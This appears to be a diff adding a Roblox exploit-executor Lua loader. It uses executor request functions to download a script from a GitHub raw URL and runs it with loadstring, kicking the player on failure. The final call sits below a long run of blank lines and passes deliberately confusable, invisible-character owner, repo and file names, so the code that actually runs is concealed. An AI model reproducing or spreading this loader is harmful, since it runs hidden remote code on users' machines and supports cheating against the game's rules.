@@ -1,0 +1,75 @@
+
+local services = setmetatable({}, { __index = function(self, key) return game:GetService(key) end })
+local client = services.Players.LocalPlayer;
+
+local request = request or http_request
+if type(syn) == 'table' and type(syn.request) == 'function' then
+    request = syn.request
+end
+
+local KickClient, HoodFrm55th do
+    function KickClient(reason)
+        return client:Kick(reason)
+    end
+
+    local function GetUrl(url)
+        local response = request({ Url = url, Method = 'GET' })
+
+        local success = response.Success;
+        local body = response.Body;
+
+        if not success then
+            return false, 'Request failed. StatusCode: ' .. response.StatusCode
+        end
+
+        return true, body
+    end
+
+    function HoodFrm55th(owner, repo, file)
+        local url = "https://raw.githubusercontent.com/" .. owner .. "/" .. repo .. "/main/" .. file
+        local success, body = GetUrl(url)
+
+        if not success then
+            return KickClient('Failed to connect. ' .. table.concat({ 'Url:', url, '\n', 'Error:', tostring(body) }))
+        end
+
+        local fn, err = loadstring(body)
+        if not fn then
+            return KickClient('Failed to connect. ' .. table.concat({ 'Url:', url, '\n', 'Error:', tostring(err) }))
+        end
+
+        local results = { pcall(fn) }
+        local success = table.remove(results, 1)
+
+        if not success then
+            return KickClient('Failed to connect.. ' .. table.concat({ 'Url:', url, '\n', 'Error:', tostring(results[1]) }))
+        end
+
+        return unpack(results)
+    end
+end
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local HoodReligions = HoodFrm55th ('llllllIllllIlll',   '-', '%E3%85%A4')
